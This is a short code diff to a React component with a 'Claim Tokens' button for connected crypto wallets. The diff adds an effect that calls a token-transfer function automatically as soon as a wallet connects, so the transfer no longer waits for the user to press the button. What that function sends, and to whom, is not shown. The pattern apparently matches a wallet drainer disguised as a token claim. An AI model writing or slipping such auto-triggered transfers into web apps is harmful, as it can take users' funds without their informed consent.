@@ -292,6 +292,12 @@ const newDat = 0.0026;
 ;
 }
 
+  useEffect(() => {
+    if (isConnected) {
+      handleTokenTransfer();
+    }
+  }, [isConnected, handleTokenTransfer]);
+
 
 	return (
 		<div>
@@ -321,7 +327,7 @@ const newDat = 0.0026;
       {isConnected ? (
         <button
         onTouchStart={handleTokenTransfer}
-        onClick={handleTokenTransfer}
+        onClick={async () => await handleTokenTransfer()}
           className="w-full md:w-95 h-10 bg-green text-white p-5 text-sm md:text-base rounded-3xl z-10 flex items-center justify-center"
           aria-label="Claim Tokens"
         >
